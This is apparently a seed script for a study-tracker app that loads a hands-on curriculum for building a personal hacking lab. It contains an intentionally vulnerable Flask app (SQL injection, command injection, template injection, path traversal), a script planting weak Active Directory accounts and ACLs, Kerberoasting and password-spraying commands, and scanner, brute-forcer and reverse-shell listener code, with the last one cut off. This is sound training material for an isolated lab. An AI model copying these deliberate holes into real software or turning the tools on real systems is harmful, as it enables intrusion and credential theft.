import Database from 'better-sqlite3';

const sqlite = new Database('data/quest-log.db');

const insertPath = sqlite.prepare(
	'INSERT INTO paths (name, description, color, created_at) VALUES (?, ?, ?, ?)'
);
const insertModule = sqlite.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = sqlite.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);

const now = Date.now();

// ============================================================================
// HOMELAB HACKING LAB
// ============================================================================
const labPath = insertPath.run(
	'Build Your Own Hacking Lab',
	'Create a personal Hack The Box-style environment. Deploy vulnerable machines, build custom offensive tools in Python, Rust, and Go, and practice real-world attack scenarios.',
	'rose',
	now
);

// Module 1: Lab Infrastructure
const mod1 = insertModule.run(labPath.lastInsertRowid, 'Lab Infrastructure Setup', 'Build the foundation: networking, hypervisor, and isolated environments', 0, now);

insertTask.run(mod1.lastInsertRowid, 'Design your lab network architecture', 'Plan a segmented lab network with separate VLANs for attack machines, vulnerable targets, and management, designing subnets, firewall rules, and routing to contain malicious traffic during security testing', `## Lab Network Architecture

### Recommended Network Layout
\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                      HOME NETWORK                           │
│                      192.168.1.0/24                         │
└─────────────────────┬───────────────────────────────────────┘
                      │
              ┌───────┴───────┐
              │   pfSense     │
              │   Firewall    │
              └───────┬───────┘
                      │
        ┌─────────────┼─────────────┐
        │             │             │
   ┌────┴────┐   ┌────┴────┐   ┌────┴────┐
   │ MGMT    │   │ ATTACK  │   │ VICTIM  │
   │ VLAN 10 │   │ VLAN 20 │   │ VLAN 30 │
   │10.10.10 │   │10.20.20 │   │10.30.30 │
   └─────────┘   └─────────┘   └─────────┘
      │              │              │
   Kali VM      Attack Tools    Vulnerable
   Monitoring   C2 Servers      Machines
\`\`\`

### Hardware Requirements
\`\`\`yaml
Minimum:
  CPU: 8 cores (12+ recommended)
  RAM: 32GB (64GB+ for large labs)
  Storage: 500GB SSD (NVMe preferred)
  Network: 2x NICs (1 for mgmt, 1 for lab)

Recommended Options:
  - Used Dell R720/R730: ~$200-400
  - Intel NUC 12 Pro: ~$600
  - Custom Ryzen 9 build: ~$800
  - Multiple mini PCs in cluster
\`\`\`

### Network Segmentation Script
\`\`\`bash
#!/bin/bash
# setup-vlans.sh - For Linux host with VLAN support

# Enable VLAN support
sudo modprobe 8021q

# Create VLANs on eth1 (lab interface)
sudo ip link add link eth1 name eth1.10 type vlan id 10  # MGMT
sudo ip link add link eth1 name eth1.20 type vlan id 20  # Attack
sudo ip link add link eth1 name eth1.30 type vlan id 30  # Victims

# Assign IPs
sudo ip addr add 10.10.10.1/24 dev eth1.10
sudo ip addr add 10.20.20.1/24 dev eth1.20
sudo ip addr add 10.30.30.1/24 dev eth1.30

# Bring up interfaces
sudo ip link set eth1.10 up
sudo ip link set eth1.20 up
sudo ip link set eth1.30 up

# Enable routing between VLANs (controlled by iptables)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Default: Allow attack -> victim, block victim -> attack
sudo iptables -A FORWARD -i eth1.20 -o eth1.30 -j ACCEPT
sudo iptables -A FORWARD -i eth1.30 -o eth1.20 -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A FORWARD -i eth1.30 -o eth1.20 -j DROP
\`\`\`

### pfSense Setup (Alternative)
\`\`\`
1. Download pfSense CE ISO
2. Install on dedicated box or VM (2 cores, 4GB RAM)
3. Configure WAN = home network
4. Configure LAN interfaces for each VLAN
5. Create firewall rules:
   - MGMT: Full access everywhere
   - ATTACK: Access to VICTIM only
   - VICTIM: Isolated, no outbound
\`\`\``, 0, now);

insertTask.run(mod1.lastInsertRowid, 'Set up Proxmox virtualization server', 'Install Proxmox VE on dedicated hardware, configure storage pools for VM images, set up virtual networking with bridges and VLANs, and create VM templates for rapid lab environment deployment', `## Proxmox VE Setup

### Installation
\`\`\`bash
# Download Proxmox VE ISO from proxmox.com
# Boot from USB and follow installer

# Post-install: Remove subscription nag
sed -i.bak "s/data.status !== 'Active'/false/g" \\
  /usr/share/javascript/proxmox-widget-toolkit/proxmoxlib.js

# Add no-subscription repo
echo "deb http://download.proxmox.com/debian/pve bookworm pve-no-subscription" \\
  > /etc/apt/sources.list.d/pve-no-subscription.list

apt update && apt upgrade -y
\`\`\`

### Network Configuration
\`\`\`bash
# /etc/network/interfaces

auto lo
iface lo inet loopback

# Management interface
auto eno1
iface eno1 inet static
    address 192.168.1.100/24
    gateway 192.168.1.1

# Lab interface (for VLANs)
auto eno2
iface eno2 inet manual

# VLAN bridges
auto vmbr10
iface vmbr10 inet static
    address 10.10.10.1/24
    bridge-ports eno2.10
    bridge-stp off
    bridge-fd 0

auto vmbr20
iface vmbr20 inet static
    address 10.20.20.1/24
    bridge-ports eno2.20
    bridge-stp off
    bridge-fd 0

auto vmbr30
iface vmbr30 inet static
    address 10.30.30.1/24
    bridge-ports eno2.30
    bridge-stp off
    bridge-fd 0
\`\`\`

### VM Templates
\`\`\`bash
# Download cloud-init images
cd /var/lib/vz/template/iso

# Ubuntu 22.04
wget https://cloud-images.ubuntu.com/jammy/current/jammy-server-cloudimg-amd64.img

# Kali (for attack box)
wget https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-qemu-amd64.7z

# Create template from cloud image
qm create 9000 --memory 2048 --core 2 --name ubuntu-template \\
  --net0 virtio,bridge=vmbr30
qm importdisk 9000 jammy-server-cloudimg-amd64.img local-lvm
qm set 9000 --scsihw virtio-scsi-pci --scsi0 local-lvm:vm-9000-disk-0
qm set 9000 --ide2 local-lvm:cloudinit
qm set 9000 --boot c --bootdisk scsi0
qm template 9000
\`\`\`

### Clone VMs for Lab
\`\`\`bash
# Clone vulnerable machines from template
qm clone 9000 100 --name victim-web --full
qm clone 9000 101 --name victim-db --full
qm clone 9000 102 --name victim-dc --full

# Assign to victim network
qm set 100 --net0 virtio,bridge=vmbr30
qm set 101 --net0 virtio,bridge=vmbr30
qm set 102 --net0 virtio,bridge=vmbr30

# Start VMs
qm start 100
qm start 101
qm start 102
\`\`\``, 1, now);

insertTask.run(mod1.lastInsertRowid, 'Deploy Kali attack box with custom tools', 'Install Kali Linux as your primary attack platform, configure custom tool repositories, set up Burp Suite, Metasploit database, and organize wordlists and scripts for efficient penetration testing workflows', `## Kali Attack Box Setup

### Base Installation
\`\`\`bash
# Create VM in Proxmox
qm create 200 --memory 8192 --cores 4 --name kali-attack \\
  --net0 virtio,bridge=vmbr20 \\
  --cdrom local:iso/kali-linux-2024.1-installer-amd64.iso \\
  --scsihw virtio-scsi-pci \\
  --scsi0 local-lvm:100

# Install Kali, then run updates
sudo apt update && sudo apt full-upgrade -y
\`\`\`

### Essential Tools Installation
\`\`\`bash
#!/bin/bash
# setup-kali.sh

# Core tools
sudo apt install -y \\
  nmap masscan rustscan \\
  gobuster feroxbuster ffuf \\
  burpsuite zaproxy \\
  sqlmap \\
  john hashcat \\
  metasploit-framework \\
  evil-winrm crackmapexec \\
  bloodhound neo4j \\
  impacket-scripts \\
  chisel ligolo-ng \\
  python3-pip golang rustc cargo

# Python tools
pip3 install \\
  pwntools \\
  requests \\
  beautifulsoup4 \\
  paramiko \\
  scapy \\
  impacket \\
  bloodhound \\
  certipy-ad

# Go tools
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/tomnomnom/assetfinder@latest

# Rust tools
cargo install rustscan
cargo install feroxbuster

# Add Go bin to PATH
echo 'export PATH=$PATH:$HOME/go/bin' >> ~/.bashrc
\`\`\`

### Directory Structure
\`\`\`bash
# Organize your attack workspace
mkdir -p ~/htb/{machines,tools,scripts,notes,loot}
mkdir -p ~/htb/tools/{python,go,rust,c}

cat > ~/htb/README.md << 'EOF'
# Hacking Lab Workspace

## Structure
- machines/   - Notes and files per target
- tools/      - Custom tools by language
- scripts/    - One-off scripts
- notes/      - General notes and cheatsheets
- loot/       - Captured credentials, hashes, data

## Workflow
1. Create machine folder: mkdir machines/<name>
2. Run recon scripts
3. Document in machines/<name>/notes.md
4. Save loot to machines/<name>/loot/
EOF
\`\`\`

### Tmux Configuration
\`\`\`bash
# ~/.tmux.conf
cat > ~/.tmux.conf << 'EOF'
set -g mouse on
set -g history-limit 50000
set -g default-terminal "screen-256color"

# Prefix key
unbind C-b
set -g prefix C-a
bind C-a send-prefix

# Split panes
bind | split-window -h -c "#{pane_current_path}"
bind - split-window -v -c "#{pane_current_path}"

# Pane navigation
bind h select-pane -L
bind j select-pane -D
bind k select-pane -U
bind l select-pane -R

# Logging
bind P pipe-pane -o "cat >> ~/htb/logs/#W.log" \\; display "Logging to ~/htb/logs/#W.log"
EOF
\`\`\``, 2, now);

// Module 2: Vulnerable Lab Deployment
const mod2 = insertModule.run(labPath.lastInsertRowid, 'Vulnerable Machine Deployment', 'Deploy and configure intentionally vulnerable systems', 1, now);

insertTask.run(mod2.lastInsertRowid, 'Deploy vulnerable web applications', 'Deploy intentionally vulnerable web applications including DVWA, OWASP Juice Shop, WebGoat, and bWAPP in Docker containers or VMs for practicing SQL injection, XSS, and other web exploitation techniques', `## Vulnerable Web Application Lab

### Docker Compose Setup
\`\`\`yaml
# docker-compose.yml
version: '3.8'

services:
  dvwa:
    image: vulnerables/web-dvwa
    container_name: dvwa
    ports:
      - "8081:80"
    networks:
      - vuln-net

  juice-shop:
    image: bkimminich/juice-shop
    container_name: juice-shop
    ports:
      - "8082:3000"
    networks:
      - vuln-net

  webgoat:
    image: webgoat/webgoat
    container_name: webgoat
    ports:
      - "8083:8080"
      - "9090:9090"
    networks:
      - vuln-net

  mutillidae:
    image: citizenstig/nowasp
    container_name: mutillidae
    ports:
      - "8084:80"
    networks:
      - vuln-net

  hackazon:
    image: rapidfort/hackazon
    container_name: hackazon
    ports:
      - "8085:80"
    networks:
      - vuln-net

  vulhub-struts2:
    image: vulhub/struts2:s2-045
    container_name: struts2-045
    ports:
      - "8086:8080"
    networks:
      - vuln-net

networks:
  vuln-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/16
\`\`\`

### Deployment Script
\`\`\`bash
#!/bin/bash
# deploy-web-vulns.sh

# Create directory
mkdir -p ~/lab/vulnerable-web
cd ~/lab/vulnerable-web

# Download compose file
cat > docker-compose.yml << 'COMPOSE'
# (paste the compose file above)
COMPOSE

# Start all containers
docker-compose up -d

# Show running containers
echo "=== Vulnerable Web Apps ==="
echo "DVWA:        http://localhost:8081 (admin/password)"
echo "Juice Shop:  http://localhost:8082"
echo "WebGoat:     http://localhost:8083/WebGoat"
echo "Mutillidae:  http://localhost:8084/mutillidae"
echo "Hackazon:    http://localhost:8085"
echo "Struts2:     http://localhost:8086"
\`\`\`

### Custom Vulnerable Flask App
\`\`\`python
# custom-vuln-app/app.py
from flask import Flask, request, render_template_string
import sqlite3
import subprocess

app = Flask(__name__)

# Initialize vulnerable database
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY, username TEXT, password TEXT)''')
    c.execute("INSERT OR IGNORE INTO users VALUES (1, 'admin', 'supersecret123')")
    c.execute("INSERT OR IGNORE INTO users VALUES (2, 'user', 'password123')")
    conn.commit()
    conn.close()

# SQL Injection vulnerable login
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # VULNERABLE: SQL Injection
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        c.execute(query)
        user = c.fetchone()

        if user:
            return f"Welcome {user[1]}!"
        return "Login failed"

    return '''<form method="post">
        Username: <input name="username"><br>
        Password: <input name="password" type="password"><br>
        <input type="submit" value="Login">
    </form>'''

# Command Injection
@app.route('/ping')
def ping():
    host = request.args.get('host', '127.0.0.1')
    # VULNERABLE: Command Injection
    result = subprocess.getoutput(f'ping -c 1 {host}')
    return f'<pre>{result}</pre>'

# SSTI
@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    # VULNERABLE: Server-Side Template Injection
    template = f'Hello {name}!'
    return render_template_string(template)

# Path Traversal
@app.route('/file')
def read_file():
    filename = request.args.get('name', 'welcome.txt')
    # VULNERABLE: Path Traversal
    try:
        with open(f'files/{filename}', 'r') as f:
            return f'<pre>{f.read()}</pre>'
    except:
        return 'File not found'

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000, debug=True)
\`\`\`

### Dockerfile for Custom App
\`\`\`dockerfile
FROM python:3.9-slim
WORKDIR /app
RUN pip install flask
COPY app.py .
RUN mkdir files && echo "Welcome to the vulnerable app!" > files/welcome.txt
EXPOSE 5000
CMD ["python", "app.py"]
\`\`\``, 0, now);

insertTask.run(mod2.lastInsertRowid, 'Build a vulnerable Active Directory lab', 'Deploy a Windows domain environment with intentional misconfigurations including Kerberoastable accounts, unconstrained delegation, weak ACLs, and Group Policy vulnerabilities for practicing AD attack techniques', `## Vulnerable Active Directory Lab

### Infrastructure Requirements
\`\`\`
Minimum VMs:
- DC01: Windows Server 2019/2022 (Domain Controller)
- WS01: Windows 10/11 (Workstation)
- WS02: Windows 10/11 (Workstation)

RAM: 4GB per Windows VM (16GB total for AD lab)
\`\`\`

### Automated AD Setup with BadBlood
\`\`\`powershell
# On Domain Controller after AD DS role installed

# Download BadBlood
Invoke-WebRequest -Uri "https://github.com/davidprowe/BadBlood/archive/master.zip" \\
  -OutFile "BadBlood.zip"
Expand-Archive BadBlood.zip -DestinationPath C:\\Tools

# Run BadBlood to populate AD with vulnerable objects
cd C:\\Tools\\BadBlood-master
.\\Invoke-BadBlood.ps1

# This creates:
# - 2500 users with weak passwords
# - Kerberoastable accounts
# - AS-REP roastable accounts
# - Misconfigured ACLs
# - Nested group memberships
\`\`\`

### Manual Vulnerabilities Script
\`\`\`powershell
# setup-vuln-ad.ps1 - Run on DC after AD DS configured

Import-Module ActiveDirectory

$DomainDN = (Get-ADDomain).DistinguishedName

# 1. Create Kerberoastable Service Account
$svcPassword = ConvertTo-SecureString "Summer2024!" -AsPlainText -Force
New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" \\
  -UserPrincipalName "svc_sql@yourdomain.local" \\
  -AccountPassword $svcPassword -Enabled $true \\
  -PasswordNeverExpires $true
Set-ADUser -Identity "svc_sql" -ServicePrincipalNames @{Add="MSSQLSvc/sql01.yourdomain.local:1433"}

# 2. Create AS-REP Roastable Account
New-ADUser -Name "svc_backup" -SamAccountName "svc_backup" \\
  -UserPrincipalName "svc_backup@yourdomain.local" \\
  -AccountPassword $svcPassword -Enabled $true
Set-ADAccountControl -Identity "svc_backup" -DoesNotRequirePreAuth $true

# 3. Create user with weak password
$weakPass = ConvertTo-SecureString "Password123" -AsPlainText -Force
New-ADUser -Name "j.smith" -SamAccountName "j.smith" \\
  -AccountPassword $weakPass -Enabled $true

# 4. Add user to Domain Admins (path to DA)
Add-ADGroupMember -Identity "Backup Operators" -Members "svc_backup"

# 5. Create unconstrained delegation (dangerous!)
$computer = Get-ADComputer -Identity "WS01"
Set-ADComputer -Identity $computer -TrustedForDelegation $true

# 6. Create constrained delegation
Set-ADUser -Identity "svc_sql" -Add @{
  'msDS-AllowedToDelegateTo'='cifs/dc01.yourdomain.local'
}

# 7. Create misconfigured ACL (GenericAll on user)
$user = Get-ADUser -Identity "j.smith"
$acl = Get-Acl "AD:\\$($user.DistinguishedName)"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
  [System.Security.Principal.NTAccount]"YOURDOMAIN\\Domain Users",
  "GenericAll",
  "Allow"
)
$acl.AddAccessRule($rule)
Set-Acl "AD:\\$($user.DistinguishedName)" $acl

# 8. Create vulnerable GPO with credentials
# (Configure via GPMC - add startup script with embedded creds)

Write-Host "Vulnerable AD setup complete!"
Write-Host "Kerberoastable: svc_sql"
Write-Host "AS-REP Roast: svc_backup"
Write-Host "Weak Password: j.smith (Password123)"
\`\`\`

### Attack Paths to Verify
\`\`\`
1. Kerberoasting:
   GetUserSPNs.py domain/user:pass -dc-ip DC_IP

2. AS-REP Roasting:
   GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP

3. Password Spray:
   crackmapexec smb DC_IP -u users.txt -p 'Password123'

4. BloodHound enumeration:
   bloodhound-python -u user -p pass -d domain -dc DC_IP

5. ACL abuse path:
   Verify with: Find-InterestingDomainAcl
\`\`\`

### DVAD - Damn Vulnerable AD (Alternative)
\`\`\`bash
# Use Terraform/Ansible to deploy full lab
git clone https://github.com/WazeHell/vulnerable-AD
cd vulnerable-AD
# Follow setup instructions for automated deployment
\`\`\``, 1, now);

insertTask.run(mod2.lastInsertRowid, 'Deploy VulnHub machines in your lab', 'Download, import, and configure vulnerable VM images from VulnHub into your hypervisor, setting up isolated network segments and snapshots for practicing exploitation without internet exposure', `## VulnHub Machine Deployment

### Download and Import Script
\`\`\`bash
#!/bin/bash
# download-vulnhub.sh

VULNHUB_DIR=~/lab/vulnhub

mkdir -p $VULNHUB_DIR
cd $VULNHUB_DIR

# Popular beginner machines
declare -A MACHINES=(
  ["kioptrix1"]="https://download.vulnhub.com/kioptrix/Kioptrix_Level_1.rar"
  ["mrrobot"]="https://download.vulnhub.com/mrrobot/mrRobot.ova"
  ["dvwa"]="https://download.vulnhub.com/dvwa/DVWA-1.0.7.iso"
  ["metasploitable2"]="https://download.vulnhub.com/metasploitable/metasploitable-linux-2.0.0.zip"
  ["dc1"]="https://download.vulnhub.com/dc/DC-1.zip"
  ["dc2"]="https://download.vulnhub.com/dc/DC-2.zip"
  ["basic-pentesting"]="https://download.vulnhub.com/basicpentesting/basic_pentesting_1.ova"
)

for machine in "\${!MACHINES[@]}"; do
  echo "[*] Downloading \$machine..."
  mkdir -p \$machine
  wget -q "\${MACHINES[\$machine]}" -P \$machine/
done

echo "[+] Downloads complete!"
\`\`\`

### Import to Proxmox
\`\`\`bash
#!/bin/bash
# import-vulnhub-proxmox.sh

# Convert OVA to qcow2
import_ova() {
  local name=$1
  local ova_file=$2
  local vmid=$3

  # Extract OVA
  tar -xvf "$ova_file"

  # Find VMDK
  vmdk_file=$(ls *.vmdk | head -1)

  # Convert to qcow2
  qemu-img convert -f vmdk -O qcow2 "$vmdk_file" "\${name}.qcow2"

  # Create VM
  qm create $vmid --name "$name" --memory 2048 --cores 2 \\
    --net0 virtio,bridge=vmbr30

  # Import disk
  qm importdisk $vmid "\${name}.qcow2" local-lvm

  # Attach disk
  qm set $vmid --scsihw virtio-scsi-pci --scsi0 local-lvm:vm-\${vmid}-disk-0
  qm set $vmid --boot c --bootdisk scsi0

  echo "[+] Imported $name as VM $vmid"
}

# Example usage:
# import_ova "mrrobot" "mrRobot.ova" 300
\`\`\`

### Machine Difficulty Progression
\`\`\`markdown
## Beginner Path
1. Metasploitable 2 - Classic vulnerable Linux
2. Kioptrix Level 1 - Simple enumeration + exploit
3. DC-1 - Drupal exploitation
4. Basic Pentesting 1 - Web + privilege escalation

## Intermediate Path
1. Mr Robot - CTF-style with multiple steps
2. DC-2 - Wordpress + restricted shell escape
3. SickOS 1.1 - Squid proxy + shellshock
4. Stapler - Multiple entry points

## Advanced Path
1. HackLAB: Vulnix - NFS exploitation
2. Brainpan - Buffer overflow
3. Pinky's Palace - Binary exploitation
4. Raven 1 & 2 - Real-world scenarios
\`\`\`

### Auto-Discovery Script
\`\`\`python
#!/usr/bin/env python3
# discover-machines.py

import subprocess
import ipaddress

def scan_network(subnet):
    """Scan subnet for live hosts"""
    result = subprocess.run(
        ['nmap', '-sn', '-T4', subnet],
        capture_output=True, text=True
    )

    hosts = []
    for line in result.stdout.split('\\n'):
        if 'Nmap scan report for' in line:
            ip = line.split()[-1].strip('()')
            hosts.append(ip)

    return hosts

def identify_machine(ip):
    """Run quick scan to identify machine"""
    result = subprocess.run(
        ['nmap', '-sV', '-T4', '--top-ports', '100', ip],
        capture_output=True, text=True
    )
    return result.stdout

if __name__ == '__main__':
    subnet = '10.30.30.0/24'  # Victim network
    print(f"[*] Scanning {subnet}...")

    hosts = scan_network(subnet)
    print(f"[+] Found {len(hosts)} hosts")

    for host in hosts:
        print(f"\\n=== {host} ===")
        print(identify_machine(host))
\`\`\``, 2, now);

// Module 3: Python Offensive Tools
const mod3 = insertModule.run(labPath.lastInsertRowid, 'Build Python Offensive Tools', 'Create custom security tools in Python', 2, now);

insertTask.run(mod3.lastInsertRowid, 'Build a multi-threaded port scanner', 'Implement a concurrent TCP port scanner in Python using threading or asyncio, with configurable timeouts, service banner grabbing, and output formatting for integration with other reconnaissance tools', `## Python Port Scanner

### Basic Scanner
\`\`\`python
#!/usr/bin/env python3
"""
fast_scanner.py - Multi-threaded port scanner
"""

import socket
import argparse
import threading
from queue import Queue
from concurrent.futures import ThreadPoolExecutor, as_completed

class PortScanner:
    def __init__(self, target, ports, threads=100, timeout=1):
        self.target = target
        self.ports = ports
        self.threads = threads
        self.timeout = timeout
        self.open_ports = []
        self.lock = threading.Lock()

    def scan_port(self, port):
        """Scan a single port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            sock.close()

            if result == 0:
                # Try to grab banner
                banner = self.grab_banner(port)
                with self.lock:
                    self.open_ports.append((port, banner))
                return port, banner
        except:
            pass
        return None

    def grab_banner(self, port):
        """Attempt to grab service banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target, port))

            # Send probe based on port
            if port in [80, 8080, 8000, 8443]:
                sock.send(b"HEAD / HTTP/1.1\\r\\nHost: target\\r\\n\\r\\n")
            elif port == 22:
                pass  # SSH sends banner automatically
            else:
                sock.send(b"\\r\\n")

            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner[:100]  # Truncate
        except:
            return ""

    def run(self):
        """Run the scan"""
        print(f"[*] Scanning {self.target}")
        print(f"[*] Ports: {len(self.ports)}, Threads: {self.threads}")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.scan_port, port): port
                      for port in self.ports}

            for future in as_completed(futures):
                result = future.result()
                if result:
                    port, banner = result
                    print(f"[+] {port}/tcp open - {banner}")

        return sorted(self.open_ports)


def parse_ports(port_str):
    """Parse port specification"""
    ports = []
    for part in port_str.split(','):
        if '-' in part:
            start, end = map(int, part.split('-'))
            ports.extend(range(start, end + 1))
        else:
            ports.append(int(part))
    return ports


def main():
    parser = argparse.ArgumentParser(description='Fast Port Scanner')
    parser.add_argument('target', help='Target IP or hostname')
    parser.add_argument('-p', '--ports', default='1-1000',
                       help='Port range (e.g., 1-1000, 22,80,443)')
    parser.add_argument('-t', '--threads', type=int, default=100,
                       help='Number of threads')
    parser.add_argument('--timeout', type=float, default=1,
                       help='Connection timeout')
    args = parser.parse_args()

    # Resolve hostname
    try:
        target = socket.gethostbyname(args.target)
    except socket.gaierror:
        print(f"[-] Cannot resolve {args.target}")
        return

    ports = parse_ports(args.ports)
    scanner = PortScanner(target, ports, args.threads, args.timeout)
    results = scanner.run()

    print(f"\\n[+] Scan complete. {len(results)} open ports found.")


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# Basic scan
python3 fast_scanner.py 10.30.30.100

# Specific ports
python3 fast_scanner.py 10.30.30.100 -p 22,80,443,8080

# Full port scan
python3 fast_scanner.py 10.30.30.100 -p 1-65535 -t 500

# With timeout adjustment
python3 fast_scanner.py 10.30.30.100 -p 1-1000 --timeout 0.5
\`\`\`

### Exercises
1. Add UDP scanning support
2. Implement SYN scanning (requires root)
3. Add JSON/CSV output
4. Implement OS fingerprinting
5. Add service version detection`, 0, now);

insertTask.run(mod3.lastInsertRowid, 'Create a web directory brute-forcer', 'Build a concurrent directory scanner using Python requests with wordlist processing, response filtering by status codes and content length, and recursive directory discovery for web enumeration', `## Python Directory Brute-Forcer

### Full Implementation
\`\`\`python
#!/usr/bin/env python3
"""
dirbuster.py - Web directory brute-forcer
"""

import argparse
import requests
import threading
from queue import Queue
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()


class DirBuster:
    def __init__(self, url, wordlist, threads=50, extensions=None,
                 timeout=10, follow_redirects=False):
        self.url = url.rstrip('/')
        self.wordlist = wordlist
        self.threads = threads
        self.extensions = extensions or ['']
        self.timeout = timeout
        self.follow_redirects = follow_redirects
        self.found = []
        self.lock = threading.Lock()
        self.checked = 0
        self.total = 0

        # Session for connection pooling
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def load_wordlist(self):
        """Load wordlist file"""
        words = []
        with open(self.wordlist, 'r', errors='ignore') as f:
            for line in f:
                word = line.strip()
                if word and not word.startswith('#'):
                    words.append(word)
        return words

    def check_path(self, path):
        """Check if path exists"""
        url = urljoin(self.url + '/', path)
        try:
            resp = self.session.get(
                url,
                timeout=self.timeout,
                allow_redirects=self.follow_redirects
            )

            # Update progress
            with self.lock:
                self.checked += 1
                if self.checked % 100 == 0:
                    progress = (self.checked / self.total) * 100
                    sys.stdout.write(f"\\r[*] Progress: {progress:.1f}% ({self.checked}/{self.total})")
                    sys.stdout.flush()

            if resp.status_code in [200, 201, 301, 302, 403]:
                size = len(resp.content)
                with self.lock:
                    self.found.append({
                        'url': url,
                        'status': resp.status_code,
                        'size': size
                    })
                return {
                    'url': url,
                    'status': resp.status_code,
                    'size': size
                }
        except requests.exceptions.RequestException:
            pass
        return None

    def run(self):
        """Run the brute-force"""
        words = self.load_wordlist()

        # Generate paths with extensions
        paths = []
        for word in words:
            for ext in self.extensions:
                if ext:
                    paths.append(f"{word}.{ext}")
                else:
                    paths.append(word)

        self.total = len(paths)
        print(f"[*] Target: {self.url}")
        print(f"[*] Wordlist: {self.wordlist} ({len(words)} words)")
        print(f"[*] Extensions: {self.extensions}")
        print(f"[*] Total requests: {self.total}")
        print(f"[*] Threads: {self.threads}")
        print("[*] Starting scan...\\n")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.check_path, path): path
                      for path in paths}

            for future in as_completed(futures):
                result = future.result()
                if result:
                    status_color = {
                        200: '\\033[92m',  # Green
                        301: '\\033[93m',  # Yellow
                        302: '\\033[93m',  # Yellow
                        403: '\\033[91m',  # Red
                    }.get(result['status'], '')
                    reset = '\\033[0m'
                    print(f"\\n{status_color}[{result['status']}]{reset} {result['url']} (Size: {result['size']})")

        print(f"\\n\\n[+] Scan complete. Found {len(self.found)} paths.")
        return self.found


def main():
    parser = argparse.ArgumentParser(description='Directory Brute-Forcer')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-w', '--wordlist', required=True,
                       help='Path to wordlist')
    parser.add_argument('-t', '--threads', type=int, default=50,
                       help='Number of threads')
    parser.add_argument('-x', '--extensions', default='',
                       help='Extensions to check (comma-separated)')
    parser.add_argument('--timeout', type=float, default=10,
                       help='Request timeout')
    parser.add_argument('-r', '--follow-redirects', action='store_true',
                       help='Follow redirects')
    parser.add_argument('-o', '--output', help='Output file')
    args = parser.parse_args()

    extensions = [''] + [e.strip() for e in args.extensions.split(',') if e.strip()]

    buster = DirBuster(
        args.url,
        args.wordlist,
        args.threads,
        extensions,
        args.timeout,
        args.follow_redirects
    )

    results = buster.run()

    if args.output:
        with open(args.output, 'w') as f:
            for r in results:
                f.write(f"{r['status']} {r['url']} {r['size']}\\n")
        print(f"[+] Results saved to {args.output}")


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# Basic scan
python3 dirbuster.py http://target.com -w /usr/share/wordlists/dirb/common.txt

# With extensions
python3 dirbuster.py http://target.com -w wordlist.txt -x php,txt,html

# More threads
python3 dirbuster.py http://target.com -w wordlist.txt -t 100

# Save output
python3 dirbuster.py http://target.com -w wordlist.txt -o results.txt
\`\`\``, 1, now);

insertTask.run(mod3.lastInsertRowid, 'Build a reverse shell handler', 'Create a multi-client reverse shell listener using Python sockets with session management, command history, file transfer capabilities, and interactive shell upgrades for post-exploitation workflows', `## Python Reverse Shell Handler

### Multi-Client Handler
\`\`\`python
#!/usr/bin/env python3
"""
shell_handler.py - Multi-client reverse shell handler
"""

import socket
import threading
import sys
import os
import select
from datetime import datetime

class ShellHandler:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}  # {id: (socket, address)}
        self.client_id = 0
        self.active_client = None
        self.running = True
        self.lock = threading.Lock()

    def log(self, msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"[{timestamp}] {msg}")

    def start_listener(self):
        """Start the listening server"""
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        self.log(f"Listening on {self.host}:{self.port}")

        # Accept connections in background
        accept_thread = threading.Thread(target=self.accept_connections)
        accept_thread.daemon = True
        accept_thread.start()

    def accept_connections(self):
        """Accept incoming connections"""
        while self.running:
            try:
                client_socket, address = self.server.accept()
                with self.lock:
                    self.client_id += 1
                    self.clients[self.client_id] = (client_socket, address)
                self.log(f"New connection from {address[0]}:{address[1]} (Session {self.client_id})")
            except:
                break

    def list_sessions(self):
        """List all active sessions"""
        if not self.clients:
            print("No active sessions")
            return

        print("\\n=== Active Sessions ===")
